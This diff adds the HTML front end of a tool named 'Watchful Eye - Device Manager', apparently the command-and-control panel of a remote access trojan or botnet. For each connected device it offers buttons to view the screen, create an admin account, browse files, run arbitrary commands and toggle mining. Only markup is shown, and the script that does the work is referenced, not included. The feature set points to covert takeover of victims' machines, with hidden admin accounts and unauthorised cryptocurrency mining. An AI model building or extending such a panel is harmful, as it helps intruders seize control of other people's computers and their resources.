@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Watchful Eye - Device Manager</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Watchful Eye</h1>
+            <p>Device Management Server</p>
+        </header>
+
+        <main>
+            <section class="devices-section">
+                <h2>Devices</h2>
+                <div id="devices-list" class="devices-grid"></div>
+            </section>
+
+            <section class="control-section" id="control-panel" style="display:none;">
+                <h2>Control Panel: <span id="selected-device"></span></h2>
+                <div class="controls-grid">
+                    <button class="btn btn-primary" onclick="viewScreen()">View Screen</button>
+                    <button class="btn btn-success" onclick="createAdmin()">Create Admin</button>
+                    <button class="btn btn-info" onclick="browseFiles()">Browse Files</button>
+                    <button class="btn btn-warning" onclick="runCommand()">Run Command</button>
+                    <button class="btn btn-secondary" onclick="toggleMining()">Toggle Mining</button>
+                </div>
+            </section>
+
+            <section class="screen-section" id="screen-view" style="display:none;">
+                <h2>Screen View: <span id="screen-device"></span></h2>
+                <div class="screen-container">
+                    <img id="screen-image" src="" alt="Screen">
+                </div>
+                <button class="btn btn-secondary" onclick="closeScreen()">Close</button>
+            </section>
+
+            <section class="files-section" id="files-view" style="display:none;">
+                <h2>Files: <span id="files-device"></span></h2>
+                <div id="files-path" class="path-bar">C:\</div>
+                <div id="files-list" class="files-list"></div>
+                <button class="btn btn-secondary" onclick="closeFiles()">Close</button>
+            </section>
+
+            <section class="command-section" id="command-view" style="display:none;">
+                <h2>Run Command: <span id="command-device"></span></h2>
+                <input type="text" id="command-input" placeholder="Enter command...">
+                <button class="btn btn-primary" onclick="executeCommand()">Execute</button>
+                <pre id="command-output"></pre>
+                <button class="btn btn-secondary" onclick="closeCommand()">Close</button>
+            </section>
+        </main>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
